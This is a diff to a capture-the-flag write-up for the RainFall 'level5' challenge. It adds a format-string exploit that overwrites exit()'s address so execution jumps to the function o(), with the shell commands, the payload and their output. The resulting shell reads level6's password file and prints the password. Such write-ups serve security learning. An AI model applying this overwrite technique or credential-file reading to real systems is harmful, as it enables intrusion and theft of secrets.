@@ -50,7 +50,20 @@ address of exit() in hex - %addressofoindecimalx + positioning of exit
 ~~~
 We will firstly find the exit() function:
 ~~~shell
-python -c "print '\x08\x04\x98\x38'[::-1] + '%x '*10" | ./level5
+level5@RainFall:~$ python -c "print '\x08\x04\x98\x38'[::-1] + '%x '*10" | ./level5
+8200 b7fd1ac0 b7ff37d0 8049838 25207825 78252078 20782520 25207825 78252078 20782520 
+~~~
+Bingo! Number 4. Decimal for 0x080484a4 (o()) is **134513824** And here we go with the payload:
+~~~shell
+level5@RainFall:~$ python -c "print '\x08\x04\x98\x38'[::-1] + '%134513824x%4\$n'" > /tmp/flag5
+level5@RainFall:~$ cat /tmp/flag5 - | ./level5
+
+[...lots of stuff...]
+              2000
+whoami
+level6
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ~~~
 
 
